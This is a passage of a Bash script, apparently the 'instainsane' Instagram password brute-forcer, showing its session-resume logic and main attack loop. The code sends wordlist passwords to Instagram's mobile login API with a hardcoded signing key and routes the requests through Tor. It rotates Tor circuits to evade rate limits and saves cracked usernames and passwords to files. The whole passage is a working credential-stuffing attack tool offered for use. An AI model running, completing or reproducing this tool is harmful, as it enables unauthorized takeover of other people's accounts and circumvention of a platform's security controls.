    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    echo "$pass" >> rockyou.txt
  fi
) &

done
pid4=$!

let startline+=20
let endline+=20

done

}


bf5resume() {

count_pass=$(wc -l "$wl_pass" | awk '{print $1}')
while [ "$counter5" -lt "$turn" ]; do

IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
startresume1=$((startresume+1))
IFS=$'\n'
range_end=$((token+endline))
while IFS= read -r pass; do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter5++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"

(
  trap '' SIGINT
  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
  if [[ "$var" == "challenge" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "logged_in_user" ]]; then
    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
    rm -rf rockyou.txt
    kill -1 $$ > /dev/null 2>&1
  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
    echo "$pass" >> rockyou.txt
  fi
  ) &
    done < <(sed -n "${startresume1},${range_end}p" "$wl_pass")
wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1; wait $pid3 > /dev/null 2>&1; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1

let startline+=20
let endline+=20

done
}


function resume() {

banner 
checkroot
dependencies

if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi

# collect session files safely (handles no-match)
shopt -s nullglob
session_files=(sessions/store.session*)
shopt -u nullglob

if [ ${#session_files[@]} -eq 0 ]; then
  printf "\e[1;91m[*] No sessions\n\e[0m"
  exit 1
fi

countern=1
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in "${session_files[@]}"; do
  IFS=$'\n'
  # shellcheck disable=SC1090
  source "$list"
  printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$countern" "$list" "$wl_pass" "$pass"
  let countern++
done

read -p $'\e[1;92mChoose a session number: \e[0m' fileresume

# validate input
if ! [[ "$fileresume" =~ ^[0-9]+$ ]] || [ "$fileresume" -lt 1 ] || [ "$fileresume" -gt "${#session_files[@]}" ]; then
  printf "\e[1;91mInvalid selection\n\e[0m"
  exit 1
fi

selected_file="${session_files[$((fileresume-1))]}"
# shellcheck disable=SC1090
source "$selected_file"

default_threads=100
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" "$user"
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" "$wl_pass"
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
multitor

while [ true ]; do
killall -HUP tor
###pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3"; pkill -f -HUP "tor -f multitor/multitor4"; pkill -f -HUP "tor -f multitor/multitor5"

bf1resume 
let turn+=20
bf2resume
let turn+=20
bf3resume
let turn+=20
bf4resume 
let turn+=20
bf5resume

let turn-=60
###
killall -HUP tor
#pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3";pkill -f -HUP "tor -f multitor/multitor4";pkill -f -HUP "tor -f multitor/multitor5"

done
}


case "$1" in --resume) resume ;; *)

banner
checkroot
dependencies
start
multitor
killall -HUP tor

# initialize wordlist counters safely (start() sets wl_pass)

count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
count_pass=${count_pass:-0}
countpass=1

while [ "$countpass" -lt "$count_pass" ]; do

killall -HUP tor
##pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3";pkill -f -HUP "tor -f multitor/multitor4";pkill -f -HUP "tor -f multitor/multitor5"

bf1 
let turn+=20
bf2 
let turn+=20
bf3 
let turn+=20
bf4 
let turn+=20
bf5 
let turn-=60
killall -HUP tor
###
#pkill -f -HUP "tor -f multitor/multitor1"; pkill -f -HUP "tor -f multitor/multitor2"; pkill -f -HUP "tor -f multitor/multitor3"; pkill -f -HUP "tor -f multitor/multitor4"; pkill -f -HUP "tor -f multitor/multitor5"
done
exit 1
esac

# -- Results summary: print found credentials (if any) and copy to Results.sh
print_results() {
  echo
  echo "================= Results Summary ================"
  if [ -f found.instainsane ] && [ -s found.instainsane ]; then
    echo "Found credentials:"
    nl -ba found.instainsane | sed -n '1,200p'
    echo
  # ensure results dir exists
  mkdir -p results
  # include PID ($$) and nanoseconds (if supported) to avoid collisions in parallel runs
  ns=$(date +%N 2>/dev/null || echo "000000000")
  ts="$(date +'%Y%m%d-%H%M%S')-$$-${ns}"
  tsfile="results/${ts}.txt"
  cp found.instainsane "$tsfile"
  # append to master history log (timestamp and filename)
  echo "$(date +'%Y-%m-%d %H:%M:%S')  $tsfile" >> results/history.log
  echo "Saved results to: $tsfile"
  else
    echo "No credentials found."
  fi
  echo "=================================================="
}

# Call print_results when the script exits normally
trap print_results EXIT
